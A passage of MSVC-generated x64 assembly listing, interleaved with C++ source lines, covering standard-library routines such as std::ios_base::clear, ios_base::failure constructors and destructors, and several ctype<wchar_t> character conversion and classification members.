; 248  :             const char* _Msg;
; 249  :             if (_Filtered & ios_base::badbit) {

	mov	eax, DWORD PTR _Filtered$[rsp]
	and	eax, 4
	test	eax, eax
	je	SHORT $LN4@clear

; 250  :                 _Msg = "ios_base::badbit set";

	lea	rax, OFFSET FLAT:??_C@_0BF@PHHKMMFD@ios_base?3?3badbit?5set@
	mov	QWORD PTR _Msg$1[rsp], rax
	jmp	SHORT $LN5@clear
$LN4@clear:

; 251  :             } else if (_Filtered & ios_base::failbit) {

	mov	eax, DWORD PTR _Filtered$[rsp]
	and	eax, 2
	test	eax, eax
	je	SHORT $LN6@clear

; 252  :                 _Msg = "ios_base::failbit set";

	lea	rax, OFFSET FLAT:??_C@_0BG@FMKFHCIL@ios_base?3?3failbit?5set@
	mov	QWORD PTR _Msg$1[rsp], rax

; 253  :             } else {

	jmp	SHORT $LN7@clear
$LN6@clear:

; 254  :                 _Msg = "ios_base::eofbit set";

	lea	rax, OFFSET FLAT:??_C@_0BF@OOHOMBOF@ios_base?3?3eofbit?5set@
	mov	QWORD PTR _Msg$1[rsp], rax
$LN7@clear:
$LN5@clear:

; 255  :             }
; 256  : 
; 257  :             _THROW(failure(_Msg));

	mov	edx, 1
	lea	rcx, QWORD PTR $T2[rsp]
	call	?make_error_code@std@@YA?AVerror_code@1@W4io_errc@1@@Z ; std::make_error_code
	mov	r8, rax
	mov	rdx, QWORD PTR _Msg$1[rsp]
	lea	rcx, QWORD PTR $T3[rsp]
	call	??0failure@ios_base@std@@QEAA@PEBDAEBVerror_code@2@@Z ; std::ios_base::failure::failure
	lea	rdx, OFFSET FLAT:_TI5?AVfailure@ios_base@std@@
	lea	rcx, QWORD PTR $T3[rsp]
	call	_CxxThrowException
$LN2@clear:
$LN8@clear:

; 258  :         }
; 259  :     }

	add	rsp, 120				; 00000078H
	ret	0
?clear@ios_base@std@@QEAAXH_N@Z ENDP			; std::ios_base::clear
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??_Gfailure@ios_base@std@@UEAAPEAXI@Z
_TEXT	SEGMENT
this$ = 48
__flags$ = 56
??_Gfailure@ios_base@std@@UEAAPEAXI@Z PROC		; std::ios_base::failure::`scalar deleting destructor', COMDAT
$LN4:
	mov	DWORD PTR [rsp+16], edx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rcx, QWORD PTR this$[rsp]
	call	??1failure@ios_base@std@@UEAA@XZ
	mov	eax, DWORD PTR __flags$[rsp]
	and	eax, 1
	test	eax, eax
	je	SHORT $LN2@scalar
	mov	edx, 40					; 00000028H
	mov	rcx, QWORD PTR this$[rsp]
	call	??3@YAXPEAX_K@Z				; operator delete
$LN2@scalar:
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??_Gfailure@ios_base@std@@UEAAPEAXI@Z ENDP		; std::ios_base::failure::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??0failure@ios_base@std@@QEAA@AEBV012@@Z
_TEXT	SEGMENT
this$ = 48
__that$ = 56
??0failure@ios_base@std@@QEAA@AEBV012@@Z PROC		; std::ios_base::failure::failure, COMDAT
$LN3:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rdx, QWORD PTR __that$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	??0system_error@std@@QEAA@AEBV01@@Z
	mov	rax, QWORD PTR this$[rsp]
	lea	rcx, OFFSET FLAT:??_7failure@ios_base@std@@6B@
	mov	QWORD PTR [rax], rcx
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??0failure@ios_base@std@@QEAA@AEBV012@@Z ENDP		; std::ios_base::failure::failure
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??1failure@ios_base@std@@UEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1failure@ios_base@std@@UEAA@XZ PROC			; std::ios_base::failure::~failure, COMDAT
$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rcx, QWORD PTR this$[rsp]
	call	??1system_error@std@@UEAA@XZ
	add	rsp, 40					; 00000028H
	ret	0
??1failure@ios_base@std@@UEAA@XZ ENDP			; std::ios_base::failure::~failure
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xiosbase
;	COMDAT ??0failure@ios_base@std@@QEAA@PEBDAEBVerror_code@2@@Z
_TEXT	SEGMENT
$T1 = 32
this$ = 80
_Message$ = 88
_Errcode$ = 96
??0failure@ios_base@std@@QEAA@PEBDAEBVerror_code@2@@Z PROC ; std::ios_base::failure::failure, COMDAT

; 201  :         explicit failure(const char* _Message, const error_code& _Errcode = make_error_code(io_errc::stream))

$LN4:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	push	rsi
	push	rdi
	sub	rsp, 56					; 00000038H

; 202  :             : system_error(_Errcode, _Message) {} // construct with message

	lea	rax, QWORD PTR $T1[rsp]
	mov	rdi, rax
	mov	rsi, QWORD PTR _Errcode$[rsp]
	mov	ecx, 16
	rep movsb
	mov	r8, QWORD PTR _Message$[rsp]
	lea	rdx, QWORD PTR $T1[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	??0system_error@std@@QEAA@Verror_code@1@PEBD@Z ; std::system_error::system_error
	mov	rax, QWORD PTR this$[rsp]
	lea	rcx, OFFSET FLAT:??_7failure@ios_base@std@@6B@
	mov	QWORD PTR [rax], rcx
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 56					; 00000038H
	pop	rdi
	pop	rsi
	ret	0
??0failure@ios_base@std@@QEAA@PEBDAEBVerror_code@2@@Z ENDP ; std::ios_base::failure::failure
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xutility
;	COMDAT ??$_Adl_verify_range@PEA_WPEB_W@std@@YAXAEBQEA_WAEBQEB_W@Z
_TEXT	SEGMENT
_First$ = 8
_Last$ = 16
??$_Adl_verify_range@PEA_WPEB_W@std@@YAXAEBQEA_WAEBQEB_W@Z PROC ; std::_Adl_verify_range<wchar_t *,wchar_t const *>, COMDAT

; 1331 : constexpr void _Adl_verify_range(const _Iter& _First, const _Sentinel& _Last) {

	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx

; 1332 :     // check that [_First, _Last) forms an iterator range
; 1333 :     if constexpr (_Range_verifiable_v<_Iter, _Sentinel>) {
; 1334 :         _Verify_range(_First, _Last);
; 1335 :     }
; 1336 : }

	ret	0
??$_Adl_verify_range@PEA_WPEB_W@std@@YAXAEBQEA_WAEBQEB_W@Z ENDP ; std::_Adl_verify_range<wchar_t *,wchar_t const *>
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ??_G?$ctype@_W@std@@MEAAPEAXI@Z
_TEXT	SEGMENT
this$ = 48
__flags$ = 56
??_G?$ctype@_W@std@@MEAAPEAXI@Z PROC			; std::ctype<wchar_t>::`scalar deleting destructor', COMDAT
$LN4:
	mov	DWORD PTR [rsp+16], edx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rcx, QWORD PTR this$[rsp]
	call	??1?$ctype@_W@std@@MEAA@XZ		; std::ctype<wchar_t>::~ctype<wchar_t>
	mov	eax, DWORD PTR __flags$[rsp]
	and	eax, 1
	test	eax, eax
	je	SHORT $LN2@scalar
	mov	edx, 96					; 00000060H
	mov	rcx, QWORD PTR this$[rsp]
	call	??3@YAXPEAX_K@Z				; operator delete
$LN2@scalar:
	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??_G?$ctype@_W@std@@MEAAPEAXI@Z ENDP			; std::ctype<wchar_t>::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ?do_narrow@?$ctype@_W@std@@MEBAPEB_WPEB_W0DPEAD@Z
_TEXT	SEGMENT
this$ = 48
_First$ = 56
_Last$ = 64
_Dflt$ = 72
_Dest$ = 80
?do_narrow@?$ctype@_W@std@@MEBAPEB_WPEB_W0DPEAD@Z PROC	; std::ctype<wchar_t>::do_narrow, COMDAT

; 2980 :         char* _Dest) const { // narrow elements in [_First, _Last) to chars

$LN6:
	mov	BYTE PTR [rsp+32], r9b
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 2981 :         _Adl_verify_range(_First, _Last);

	lea	rdx, QWORD PTR _Last$[rsp]
	lea	rcx, QWORD PTR _First$[rsp]
	call	??$_Adl_verify_range@PEB_WPEB_W@std@@YAXAEBQEB_W0@Z ; std::_Adl_verify_range<wchar_t const *,wchar_t const *>

; 2982 :         for (; _First != _Last; ++_First, ++_Dest) {

	jmp	SHORT $LN4@do_narrow
$LN2@do_narrow:
	mov	rax, QWORD PTR _First$[rsp]
	add	rax, 2
	mov	QWORD PTR _First$[rsp], rax
	mov	rax, QWORD PTR _Dest$[rsp]
	inc	rax
	mov	QWORD PTR _Dest$[rsp], rax
$LN4@do_narrow:
	mov	rax, QWORD PTR _Last$[rsp]
	cmp	QWORD PTR _First$[rsp], rax
	je	SHORT $LN3@do_narrow

; 2983 :             *_Dest = _Donarrow(*_First, _Dflt);

	movzx	r8d, BYTE PTR _Dflt$[rsp]
	mov	rax, QWORD PTR _First$[rsp]
	movzx	edx, WORD PTR [rax]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Donarrow@?$ctype@_W@std@@IEBAD_WD@Z	; std::ctype<wchar_t>::_Donarrow
	mov	rcx, QWORD PTR _Dest$[rsp]
	mov	BYTE PTR [rcx], al

; 2984 :         }

	jmp	SHORT $LN2@do_narrow
$LN3@do_narrow:

; 2985 : 
; 2986 :         return _First;

	mov	rax, QWORD PTR _First$[rsp]

; 2987 :     }

	add	rsp, 40					; 00000028H
	ret	0
?do_narrow@?$ctype@_W@std@@MEBAPEB_WPEB_W0DPEAD@Z ENDP	; std::ctype<wchar_t>::do_narrow
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ?do_narrow@?$ctype@_W@std@@MEBAD_WD@Z
_TEXT	SEGMENT
this$ = 48
_Ch$ = 56
_Dflt$ = 64
?do_narrow@?$ctype@_W@std@@MEBAD_WD@Z PROC		; std::ctype<wchar_t>::do_narrow, COMDAT

; 2975 :     virtual char __CLR_OR_THIS_CALL do_narrow(_Elem _Ch, char _Dflt) const { // narrow element to char

$LN3:
	mov	BYTE PTR [rsp+24], r8b
	mov	WORD PTR [rsp+16], dx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 2976 :         return _Donarrow(_Ch, _Dflt);

	movzx	r8d, BYTE PTR _Dflt$[rsp]
	movzx	edx, WORD PTR _Ch$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Donarrow@?$ctype@_W@std@@IEBAD_WD@Z	; std::ctype<wchar_t>::_Donarrow

; 2977 :     }

	add	rsp, 40					; 00000028H
	ret	0
?do_narrow@?$ctype@_W@std@@MEBAD_WD@Z ENDP		; std::ctype<wchar_t>::do_narrow
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ?_Donarrow@?$ctype@_W@std@@IEBAD_WD@Z
_TEXT	SEGMENT
tv77 = 32
_Mbst$ = 40
_Buf$ = 48
__$ArrayPad$ = 56
this$ = 80
_Ch$ = 88
_Dflt$ = 96
?_Donarrow@?$ctype@_W@std@@IEBAD_WD@Z PROC		; std::ctype<wchar_t>::_Donarrow, COMDAT

; 2969 :     char __CLR_OR_THIS_CALL _Donarrow(_Elem _Ch, char _Dflt) const { // narrow element to char

$LN5:
	mov	BYTE PTR [rsp+24], r8b
	mov	WORD PTR [rsp+16], dx
	mov	QWORD PTR [rsp+8], rcx
	push	rdi
	sub	rsp, 64					; 00000040H
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rsp], rax

; 2970 :         char _Buf[MB_LEN_MAX];
; 2971 :         mbstate_t _Mbst = {};

	lea	rax, QWORD PTR _Mbst$[rsp]
	mov	rdi, rax
	xor	eax, eax
	mov	ecx, 8
	rep stosb

; 2972 :         return _Wcrtomb(_Buf, _Ch, &_Mbst, &_Cvt) != 1 ? _Dflt : _Buf[0];

	mov	rax, QWORD PTR this$[rsp]
	add	rax, 48					; 00000030H
	mov	r9, rax
	lea	r8, QWORD PTR _Mbst$[rsp]
	movzx	edx, WORD PTR _Ch$[rsp]
	lea	rcx, QWORD PTR _Buf$[rsp]
	call	_Wcrtomb
	cmp	eax, 1
	je	SHORT $LN3@Donarrow
	movzx	eax, BYTE PTR _Dflt$[rsp]
	mov	BYTE PTR tv77[rsp], al
	jmp	SHORT $LN4@Donarrow
$LN3@Donarrow:
	mov	eax, 1
	imul	rax, rax, 0
	movzx	eax, BYTE PTR _Buf$[rsp+rax]
	mov	BYTE PTR tv77[rsp], al
$LN4@Donarrow:
	movzx	eax, BYTE PTR tv77[rsp]

; 2973 :     }

	mov	rcx, QWORD PTR __$ArrayPad$[rsp]
	xor	rcx, rsp
	call	__security_check_cookie
	add	rsp, 64					; 00000040H
	pop	rdi
	ret	0
?_Donarrow@?$ctype@_W@std@@IEBAD_WD@Z ENDP		; std::ctype<wchar_t>::_Donarrow
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ?do_widen@?$ctype@_W@std@@MEBAPEBDPEBD0PEA_W@Z
_TEXT	SEGMENT
this$ = 48
_First$ = 56
_Last$ = 64
_Dest$ = 72
?do_widen@?$ctype@_W@std@@MEBAPEBDPEBD0PEA_W@Z PROC	; std::ctype<wchar_t>::do_widen, COMDAT

; 2960 :         const char* _First, const char* _Last, _Elem* _Dest) const { // widen chars in [_First, _Last)

$LN6:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 2961 :         _Adl_verify_range(_First, _Last);

	lea	rdx, QWORD PTR _Last$[rsp]
	lea	rcx, QWORD PTR _First$[rsp]
	call	??$_Adl_verify_range@PEBDPEBD@std@@YAXAEBQEBD0@Z ; std::_Adl_verify_range<char const *,char const *>

; 2962 :         for (; _First != _Last; ++_First, ++_Dest) {

	jmp	SHORT $LN4@do_widen
$LN2@do_widen:
	mov	rax, QWORD PTR _First$[rsp]
	inc	rax
	mov	QWORD PTR _First$[rsp], rax
	mov	rax, QWORD PTR _Dest$[rsp]
	add	rax, 2
	mov	QWORD PTR _Dest$[rsp], rax
$LN4@do_widen:
	mov	rax, QWORD PTR _Last$[rsp]
	cmp	QWORD PTR _First$[rsp], rax
	je	SHORT $LN3@do_widen

; 2963 :             *_Dest = _Dowiden(*_First);

	mov	rax, QWORD PTR _First$[rsp]
	movzx	edx, BYTE PTR [rax]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Dowiden@?$ctype@_W@std@@IEBA_WD@Z	; std::ctype<wchar_t>::_Dowiden
	mov	rcx, QWORD PTR _Dest$[rsp]
	mov	WORD PTR [rcx], ax

; 2964 :         }

	jmp	SHORT $LN2@do_widen
$LN3@do_widen:

; 2965 : 
; 2966 :         return _First;

	mov	rax, QWORD PTR _First$[rsp]

; 2967 :     }

	add	rsp, 40					; 00000028H
	ret	0
?do_widen@?$ctype@_W@std@@MEBAPEBDPEBD0PEA_W@Z ENDP	; std::ctype<wchar_t>::do_widen
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ?do_widen@?$ctype@_W@std@@MEBA_WD@Z
_TEXT	SEGMENT
this$ = 48
_Byte$ = 56
?do_widen@?$ctype@_W@std@@MEBA_WD@Z PROC		; std::ctype<wchar_t>::do_widen, COMDAT

; 2955 :     virtual _Elem __CLR_OR_THIS_CALL do_widen(char _Byte) const { // widen char

$LN3:
	mov	BYTE PTR [rsp+16], dl
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 2956 :         return _Dowiden(_Byte);

	movzx	edx, BYTE PTR _Byte$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Dowiden@?$ctype@_W@std@@IEBA_WD@Z	; std::ctype<wchar_t>::_Dowiden

; 2957 :     }

	add	rsp, 40					; 00000028H
	ret	0
?do_widen@?$ctype@_W@std@@MEBA_WD@Z ENDP		; std::ctype<wchar_t>::do_widen
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ?_Dowiden@?$ctype@_W@std@@IEBA_WD@Z
_TEXT	SEGMENT
tv76 = 48
_Wc$ = 52
_Mbst$ = 56
this$ = 80
_Byte$ = 88
?_Dowiden@?$ctype@_W@std@@IEBA_WD@Z PROC		; std::ctype<wchar_t>::_Dowiden, COMDAT

; 2949 :     _Elem __CLR_OR_THIS_CALL _Dowiden(char _Byte) const { // widen char

$LN5:
	mov	BYTE PTR [rsp+16], dl
	mov	QWORD PTR [rsp+8], rcx
	push	rdi
	sub	rsp, 64					; 00000040H

; 2950 :         mbstate_t _Mbst = {};

	lea	rax, QWORD PTR _Mbst$[rsp]
	mov	rdi, rax
	xor	eax, eax
	mov	ecx, 8
	rep stosb

; 2951 :         wchar_t _Wc;
; 2952 :         return _Mbrtowc(&_Wc, &_Byte, 1, &_Mbst, &_Cvt) < 0 ? static_cast<wchar_t>(WEOF) : _Wc;

	mov	rax, QWORD PTR this$[rsp]
	add	rax, 48					; 00000030H
	mov	QWORD PTR [rsp+32], rax
	lea	r9, QWORD PTR _Mbst$[rsp]
	mov	r8d, 1
	lea	rdx, QWORD PTR _Byte$[rsp]
	lea	rcx, QWORD PTR _Wc$[rsp]
	call	_Mbrtowc
	test	eax, eax
	jge	SHORT $LN3@Dowiden
	mov	eax, 65535				; 0000ffffH
	mov	WORD PTR tv76[rsp], ax
	jmp	SHORT $LN4@Dowiden
$LN3@Dowiden:
	movzx	eax, WORD PTR _Wc$[rsp]
	mov	WORD PTR tv76[rsp], ax
$LN4@Dowiden:
	movzx	eax, WORD PTR tv76[rsp]

; 2953 :     }

	add	rsp, 64					; 00000040H
	pop	rdi
	ret	0
?_Dowiden@?$ctype@_W@std@@IEBA_WD@Z ENDP		; std::ctype<wchar_t>::_Dowiden
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ?do_toupper@?$ctype@_W@std@@MEBAPEB_WPEA_WPEB_W@Z
_TEXT	SEGMENT
this$ = 48
_First$ = 56
_Last$ = 64
?do_toupper@?$ctype@_W@std@@MEBAPEB_WPEA_WPEB_W@Z PROC	; std::ctype<wchar_t>::do_toupper, COMDAT

; 2940 :         const _Elem* _Last) const { // convert [_First, _Last) in place to upper case

$LN6:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 2941 :         _Adl_verify_range(_First, _Last);

	lea	rdx, QWORD PTR _Last$[rsp]
	lea	rcx, QWORD PTR _First$[rsp]
	call	??$_Adl_verify_range@PEA_WPEB_W@std@@YAXAEBQEA_WAEBQEB_W@Z ; std::_Adl_verify_range<wchar_t *,wchar_t const *>

; 2942 :         for (; _First != _Last; ++_First) {

	jmp	SHORT $LN4@do_toupper
$LN2@do_toupper:
	mov	rax, QWORD PTR _First$[rsp]
	add	rax, 2
	mov	QWORD PTR _First$[rsp], rax
$LN4@do_toupper:
	mov	rax, QWORD PTR _Last$[rsp]
	cmp	QWORD PTR _First$[rsp], rax
	je	SHORT $LN3@do_toupper

; 2943 :             *_First = _Towupper(*_First, &_Ctype);

	mov	rax, QWORD PTR this$[rsp]
	add	rax, 16
	mov	rdx, rax
	mov	rax, QWORD PTR _First$[rsp]
	movzx	ecx, WORD PTR [rax]
	call	_Towupper
	mov	rcx, QWORD PTR _First$[rsp]
	mov	WORD PTR [rcx], ax

; 2944 :         }

	jmp	SHORT $LN2@do_toupper
$LN3@do_toupper:

; 2945 : 
; 2946 :         return _First;

	mov	rax, QWORD PTR _First$[rsp]

; 2947 :     }

	add	rsp, 40					; 00000028H
	ret	0
?do_toupper@?$ctype@_W@std@@MEBAPEB_WPEA_WPEB_W@Z ENDP	; std::ctype<wchar_t>::do_toupper
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ?do_toupper@?$ctype@_W@std@@MEBA_W_W@Z
_TEXT	SEGMENT
this$ = 48
_Ch$ = 56
?do_toupper@?$ctype@_W@std@@MEBA_W_W@Z PROC		; std::ctype<wchar_t>::do_toupper, COMDAT

; 2935 :     virtual _Elem __CLR_OR_THIS_CALL do_toupper(_Elem _Ch) const { // convert element to upper case

$LN3:
	mov	WORD PTR [rsp+16], dx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 2936 :         return _Towupper(_Ch, &_Ctype);

	mov	rax, QWORD PTR this$[rsp]
	add	rax, 16
	mov	rdx, rax
	movzx	ecx, WORD PTR _Ch$[rsp]
	call	_Towupper

; 2937 :     }

	add	rsp, 40					; 00000028H
	ret	0
?do_toupper@?$ctype@_W@std@@MEBA_W_W@Z ENDP		; std::ctype<wchar_t>::do_toupper
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ?do_tolower@?$ctype@_W@std@@MEBAPEB_WPEA_WPEB_W@Z
_TEXT	SEGMENT
this$ = 48
_First$ = 56
_Last$ = 64
?do_tolower@?$ctype@_W@std@@MEBAPEB_WPEA_WPEB_W@Z PROC	; std::ctype<wchar_t>::do_tolower, COMDAT

; 2926 :         const _Elem* _Last) const { // convert [_First, _Last) in place to lower case

$LN6:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 2927 :         _Adl_verify_range(_First, _Last);

	lea	rdx, QWORD PTR _Last$[rsp]
	lea	rcx, QWORD PTR _First$[rsp]
	call	??$_Adl_verify_range@PEA_WPEB_W@std@@YAXAEBQEA_WAEBQEB_W@Z ; std::_Adl_verify_range<wchar_t *,wchar_t const *>

; 2928 :         for (; _First != _Last; ++_First) {

	jmp	SHORT $LN4@do_tolower
$LN2@do_tolower:
	mov	rax, QWORD PTR _First$[rsp]
	add	rax, 2
	mov	QWORD PTR _First$[rsp], rax
$LN4@do_tolower:
	mov	rax, QWORD PTR _Last$[rsp]
	cmp	QWORD PTR _First$[rsp], rax
	je	SHORT $LN3@do_tolower

; 2929 :             *_First = _Towlower(*_First, &_Ctype);

	mov	rax, QWORD PTR this$[rsp]
	add	rax, 16
	mov	rdx, rax
	mov	rax, QWORD PTR _First$[rsp]
	movzx	ecx, WORD PTR [rax]
	call	_Towlower
	mov	rcx, QWORD PTR _First$[rsp]
	mov	WORD PTR [rcx], ax

; 2930 :         }

	jmp	SHORT $LN2@do_tolower
$LN3@do_tolower:

; 2931 : 
; 2932 :         return _First;

	mov	rax, QWORD PTR _First$[rsp]

; 2933 :     }

	add	rsp, 40					; 00000028H
	ret	0
?do_tolower@?$ctype@_W@std@@MEBAPEB_WPEA_WPEB_W@Z ENDP	; std::ctype<wchar_t>::do_tolower
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ?do_tolower@?$ctype@_W@std@@MEBA_W_W@Z
_TEXT	SEGMENT
this$ = 48
_Ch$ = 56
?do_tolower@?$ctype@_W@std@@MEBA_W_W@Z PROC		; std::ctype<wchar_t>::do_tolower, COMDAT

; 2921 :     virtual _Elem __CLR_OR_THIS_CALL do_tolower(_Elem _Ch) const { // convert element to lower case

$LN3:
	mov	WORD PTR [rsp+16], dx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 2922 :         return _Towlower(_Ch, &_Ctype);

	mov	rax, QWORD PTR this$[rsp]
	add	rax, 16
	mov	rdx, rax
	movzx	ecx, WORD PTR _Ch$[rsp]
	call	_Towlower

; 2923 :     }

	add	rsp, 40					; 00000028H
	ret	0
?do_tolower@?$ctype@_W@std@@MEBA_W_W@Z ENDP		; std::ctype<wchar_t>::do_tolower
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ?do_scan_not@?$ctype@_W@std@@MEBAPEB_WFPEB_W0@Z
_TEXT	SEGMENT
this$ = 48
_Maskval$ = 56
_First$ = 64
_Last$ = 72
?do_scan_not@?$ctype@_W@std@@MEBAPEB_WFPEB_W0@Z PROC	; std::ctype<wchar_t>::do_scan_not, COMDAT

; 2912 :         const _Elem* _Last) const { // find first in [_First, _Last) not fitting mask classification

$LN5:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	WORD PTR [rsp+16], dx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 2913 :         _Adl_verify_range(_First, _Last);

	lea	rdx, QWORD PTR _Last$[rsp]
	lea	rcx, QWORD PTR _First$[rsp]
	call	??$_Adl_verify_range@PEB_WPEB_W@std@@YAXAEBQEB_W0@Z ; std::_Adl_verify_range<wchar_t const *,wchar_t const *>
$LN2@do_scan_no:

; 2914 :         while (_First != _Last && is(_Maskval, *_First)) {

	mov	rax, QWORD PTR _Last$[rsp]
	cmp	QWORD PTR _First$[rsp], rax
	je	SHORT $LN3@do_scan_no
	mov	rax, QWORD PTR _First$[rsp]
	movzx	r8d, WORD PTR [rax]
	movzx	edx, WORD PTR _Maskval$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?is@?$ctype@_W@std@@QEBA_NF_W@Z		; std::ctype<wchar_t>::is
	movzx	eax, al
	test	eax, eax
	je	SHORT $LN3@do_scan_no

; 2915 :             ++_First;

	mov	rax, QWORD PTR _First$[rsp]
	add	rax, 2
	mov	QWORD PTR _First$[rsp], rax

; 2916 :         }

	jmp	SHORT $LN2@do_scan_no
$LN3@do_scan_no:

; 2917 : 
; 2918 :         return _First;

	mov	rax, QWORD PTR _First$[rsp]

; 2919 :     }

	add	rsp, 40					; 00000028H
	ret	0
?do_scan_not@?$ctype@_W@std@@MEBAPEB_WFPEB_W0@Z ENDP	; std::ctype<wchar_t>::do_scan_not
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ?do_scan_is@?$ctype@_W@std@@MEBAPEB_WFPEB_W0@Z
_TEXT	SEGMENT
this$ = 48
_Maskval$ = 56
_First$ = 64
_Last$ = 72
?do_scan_is@?$ctype@_W@std@@MEBAPEB_WFPEB_W0@Z PROC	; std::ctype<wchar_t>::do_scan_is, COMDAT

; 2902 :         const _Elem* _Last) const { // find first in [_First, _Last) that fits mask classification

$LN5:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	WORD PTR [rsp+16], dx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H

; 2903 :         _Adl_verify_range(_First, _Last);

	lea	rdx, QWORD PTR _Last$[rsp]
	lea	rcx, QWORD PTR _First$[rsp]
	call	??$_Adl_verify_range@PEB_WPEB_W@std@@YAXAEBQEB_W0@Z ; std::_Adl_verify_range<wchar_t const *,wchar_t const *>
$LN2@do_scan_is:

; 2904 :         while (_First != _Last && !is(_Maskval, *_First)) {

	mov	rax, QWORD PTR _Last$[rsp]
	cmp	QWORD PTR _First$[rsp], rax
	je	SHORT $LN3@do_scan_is
	mov	rax, QWORD PTR _First$[rsp]
	movzx	r8d, WORD PTR [rax]
	movzx	edx, WORD PTR _Maskval$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?is@?$ctype@_W@std@@QEBA_NF_W@Z		; std::ctype<wchar_t>::is
	movzx	eax, al
	test	eax, eax
	jne	SHORT $LN3@do_scan_is

; 2905 :             ++_First;

	mov	rax, QWORD PTR _First$[rsp]
	add	rax, 2
	mov	QWORD PTR _First$[rsp], rax

; 2906 :         }

	jmp	SHORT $LN2@do_scan_is
$LN3@do_scan_is:

; 2907 : 
; 2908 :         return _First;

	mov	rax, QWORD PTR _First$[rsp]

; 2909 :     }

	add	rsp, 40					; 00000028H
	ret	0
?do_scan_is@?$ctype@_W@std@@MEBAPEB_WFPEB_W0@Z ENDP	; std::ctype<wchar_t>::do_scan_is
_TEXT	ENDS
